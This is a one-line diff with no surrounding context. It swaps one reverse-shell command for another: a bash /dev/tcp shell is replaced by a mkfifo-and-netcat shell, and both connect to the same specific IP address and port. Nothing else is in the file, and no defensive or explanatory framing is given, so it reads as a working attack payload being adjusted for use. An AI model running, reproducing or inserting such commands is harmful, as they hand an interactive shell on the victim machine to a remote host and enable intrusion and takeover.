@@ -1,1 +1,1 @@
-bash -c '0<&194-;exec 194<>/dev/tcp/135.125.108.165/4435;sh <&194 >&194 2>&194'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 135.125.108.165 4435 >/tmp/f
